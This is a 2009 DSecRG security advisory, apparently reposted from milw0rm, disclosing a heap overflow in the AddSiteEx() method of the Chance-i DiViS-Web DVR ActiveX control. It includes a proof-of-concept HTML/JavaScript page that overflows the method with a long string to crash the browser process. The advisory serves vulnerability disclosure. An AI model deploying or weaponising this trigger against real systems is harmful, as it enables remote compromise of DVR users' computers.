@@ -1,0 +1,91 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-09-035
+
+original advisory:   http://dsecrg.com/pages/vul/DSECRG-09-035.html
+
+
+Application:                Chance-i DiViS-Web DVR System ActiveX control
+Versions Affected:          3,0,0,7
+Vendor URL:                 http://www.chance-i.com/
+Bug:                        Heap Overflow
+Exploits:                   YES
+Reported:                   13.03.2009
+Second Reported:            20.03.2009
+Solution:                   NONE
+Date of Public Advisory:    09.04.2009
+Author:                     Digital Security Research Group [DSecRG] (research [at] dsecrg [dot] com)
+
+
+
+Description
+***********
+
+DiViS-Web ActiveX (ActiveView.cab) has Heap Overflow vulnerability.
+
+
+
+Details
+*******
+
+Heap overflow vulnerability found in AddSiteEx() function.
+
+There is an exploitable heap overflow vulnerability in DVR's ActiveX
+control (ActiveView.cab).
+
+If an DVR user were to visit a malicious web page, the overflow could be triggered allowing for a "remote" compromise of the user's machine. Alternatively, an attacker could send their target a specially crafted e-mail, loaded with an exploit to take advantage of this vulnerability.
+
+The problem arises by passing an overly long string to the AddSiteEx
+method of the control.
+
+PoC:
+
+    <OBJECT ID="DVR" classid="clsid:66F7F252-3FE1-4650-B1E5-94B2A38271C5" STYLE="width: 0px;">
+    <PARAM NAME="_Version" VALUE="65536">
+    <PARAM NAME="_ExtentX" VALUE="18203">
+    <PARAM NAME="_ExtentY" VALUE="13705">
+    <PARAM NAME="_StockProps" VALUE="0">
+    <PARAM NAME="Split" VALUE="4">
+    </OBJECT>
+
+    //server address
+    var g_sAddress = location.hostname;
+    var g_sId = "";
+    var g_sPwd = "";
+    var g_bLogin = false;
+    var g_nMaxCamera = 16;
+
+    // Port setting
+    var g_nImage = 3000;
+    var g_nControl = 3001;
+    var g_nSound = 8800;
+
+    var long_buff = "alexsint";
+
+    while(long_buff.length<(550*8)) long_buff = long_buff + "alexsint"; //rewrite registers
+
+    DVR.Channels = 1;
+
+    DVR.AddSiteEx("", "", long_buff, "", 0, g_nImage, g_nControl, g_nSound); //Crash on Free() at ntdll
+
+
+
+Solution
+********
+
+We did not get any response from vendor for more than 2 weeks.
+
+No patches aviable.
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards.
+Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:    research [at] dsecrg [dot] com
+            http://www.dsecrg.com
+            http://www.dsec.ru
+
+# milw0rm.com [2009-04-10]
